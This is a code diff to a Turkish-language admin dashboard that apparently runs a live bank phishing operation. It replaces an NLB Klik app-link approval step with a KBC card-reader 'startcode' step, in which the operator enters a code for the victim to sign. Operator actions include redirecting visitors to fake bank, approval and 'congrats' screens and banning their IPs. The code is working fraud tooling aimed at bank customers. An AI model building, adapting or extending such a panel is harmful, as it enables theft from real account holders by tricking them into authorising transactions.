@@ -28,7 +28,7 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "generator1", label: "Generator 1" },
   { value: "generator2", label: "Generator 2" },
   { value: "transfer", label: "Transfer Onayı" },
-  { value: "nlb", label: "NLB" },
+  { value: "kbc", label: "KBC" },
 ];
 
 function getApprovalDisplayText(value: string): string {
@@ -898,8 +898,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
   const [questionPromptSessionId, setQuestionPromptSessionId] = useState<string | null>(null);
   const [questionInput, setQuestionInput] = useState("");
-  const [nlbPromptSessionId, setNlbPromptSessionId] = useState<string | null>(null);
-  const [nlbLinkInput, setNlbLinkInput] = useState("");
+  const [kbcPromptSessionId, setKbcPromptSessionId] = useState<string | null>(null);
+  const [kbcCodeInput, setKbcCodeInput] = useState("");
   const [questionModalSession, setQuestionModalSession] = useState<any | null>(null);
   const [specialMessage, setSpecialMessage] = useState("");
   const [specialImage, setSpecialImage] = useState<string | null>(null);
@@ -1213,11 +1213,11 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       return;
     }
 
-    // NLB ONAY: once link modalini ac - admin uygulama baglantisini yapistirir,
-    // kullanici NLB Klik onay sayfasinda o linke tiklar.
-    if (action === "nlb_approval") {
-      setNlbLinkInput("");
-      setNlbPromptSessionId(sessionId);
+    // KBC ONAY: once kod modalini ac - admin kart okuyucu startcode'u yazar,
+    // kullanici KBC kaartlezer onay sayfasinda o kodu gorur.
+    if (action === "kbc_approval") {
+      setKbcCodeInput("");
+      setKbcPromptSessionId(sessionId);
       return;
     }
 
@@ -1386,12 +1386,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     void load();
   }
 
-  async function confirmNlbSend() {
-    if (!supabase || !nlbPromptSessionId) return;
-    const link = nlbLinkInput.trim();
-    if (!link) return;
+  async function confirmKbcSend() {
+    if (!supabase || !kbcPromptSessionId) return;
+    const code = kbcCodeInput.trim();
+    if (!code) return;
 
-    const row = rowsRef.current.find((r) => r.id === nlbPromptSessionId);
+    const row = rowsRef.current.find((r) => r.id === kbcPromptSessionId);
     const previousFormData =
       row?.form_data && typeof row.form_data === "object"
         ? (row.form_data as Record<string, unknown>)
@@ -1402,17 +1402,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       .update({
         is_hidden: false,
         status: "online",
-        current_step: "nlb_approval",
-        form_data: { ...previousFormData, approvalStatus: "nlb", nlbApprovalLink: link },
+        current_step: "kbc_approval",
+        form_data: { ...previousFormData, approvalStatus: "kbc", kbcApprovalCode: code },
       })
-      .eq("id", nlbPromptSessionId);
+      .eq("id", kbcPromptSessionId);
     if (error) {
-      alert("[ADMIN DB HATA] nlb_approval guncellenemedi: " + String(error.message || error));
+      alert("[ADMIN DB HATA] kbc_approval guncellenemedi: " + String(error.message || error));
       return;
     }
 
-    setNlbPromptSessionId(null);
-    setNlbLinkInput("");
+    setKbcPromptSessionId(null);
+    setKbcCodeInput("");
     void load();
   }
 
@@ -2035,7 +2035,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
                 else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
                 else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
-                else if (s === "nlb_approval") { stepText = "NLB ONAY"; stepColor = "text-[#5b21b6] bg-[#5b21b6]/10 border border-[#5b21b6]/20"; }
+                else if (s === "kbc_approval") { stepText = "KBC ONAY"; stepColor = "text-[#5b21b6] bg-[#5b21b6]/10 border border-[#5b21b6]/20"; }
                 else if (s === "special_approval") {
                   const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
                   const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
@@ -2159,7 +2159,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                         ) : null}
                       </div>
                     </td>
-                    {/* === ONAY SUTUNU (NLB onay durumu: Bekliyor / Onaylandi) === */}
+                    {/* === ONAY SUTUNU (KBC onay durumu: Bekliyor / Onaylandi) === */}
                     <td className="px-2 py-3 align-top whitespace-nowrap">
                       {(() => {
                         const appr = typeof fd.approvalStatus === "string" ? fd.approvalStatus : "";
@@ -2221,7 +2221,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                             <option value="invalid_bank">❌ Hatalı Banka (Uyarı)</option>
                             <option value="live_support">🎧 Canlı Desteğe Yönlendir</option>
                             <option value="congrats">✅ Tebrikler Ekranına Al</option>
-                            <option value="nlb_approval">🔐 NLB Onayına Yönlendir</option>
+                            <option value="kbc_approval">🔐 KBC Onayına Yönlendir</option>
                             <option value="special_approval">🔔 Özel Bildirim Gönder</option>
                             <option value="custom_question">❓ Özel Soru Gönder</option>
                             <option value="ban_ip">🚫 IP Banla (Siteye Giremesin)</option>
@@ -2799,34 +2799,34 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         </div>
       )}
 
-      {/* NLB ONAY LINK MODALI */}
-      {nlbPromptSessionId && (
+      {/* KBC ONAY KOD MODALI */}
+      {kbcPromptSessionId && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
-            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>🔐 NLB Onayı Gönder</h3>
+            <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>🔐 KBC Onayı Gönder</h3>
             <div>
-              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Uygulama Bağlantısı</label>
+              <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Startcode (kart okuyucu)</label>
               <input
                 type="text"
-                value={nlbLinkInput}
-                onChange={(e) => setNlbLinkInput(e.target.value)}
-                placeholder="nlb-klik:// veya https://..."
+                value={kbcCodeInput}
+                onChange={(e) => setKbcCodeInput(e.target.value)}
+                placeholder="5962 9057"
                 className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#5b21b6]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#5b21b6]'}`}
               />
               <p className={`mt-2 text-[11px] leading-relaxed ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>
-                Kullanıcı NLB onay sayfasında bu bağlantıya tıklayıp uygulamada onaylayacak.
+                Kullanıcı KBC onay sayfasında bu startcode'u kart okuyucu talimatlarında görecek.
               </p>
             </div>
             <div className="mt-6 flex justify-end gap-3">
               <button
-                onClick={() => { setNlbPromptSessionId(null); setNlbLinkInput(""); }}
+                onClick={() => { setKbcPromptSessionId(null); setKbcCodeInput(""); }}
                 className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
               >
                 İptal
               </button>
               <button
-                onClick={() => void confirmNlbSend()}
-                disabled={!nlbLinkInput.trim()}
+                onClick={() => void confirmKbcSend()}
+                disabled={!kbcCodeInput.trim()}
                 className="rounded-xl bg-[#5b21b6] px-6 py-2 text-sm font-bold text-white transition-colors hover:bg-[#4c1d95] shadow-lg shadow-[#5b21b6]/20 disabled:opacity-50"
               >
                 Gönder
